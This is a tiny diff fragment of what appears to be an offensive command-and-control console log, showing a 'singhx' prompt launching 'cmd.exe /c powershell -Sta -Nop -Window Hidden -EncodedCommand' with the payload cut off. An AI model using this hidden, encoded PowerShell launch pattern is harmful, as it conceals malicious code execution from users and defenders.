@@ -95,3 +95,4 @@ PowerShell Imported
 [07/24/2023 18:28:20 UTC] PowerShell completed
 
 (singhx) > powershell helper -custom "cmd.exe /c powershell -Sta -Nop -Window Hidden -EncodedCommand 
+```
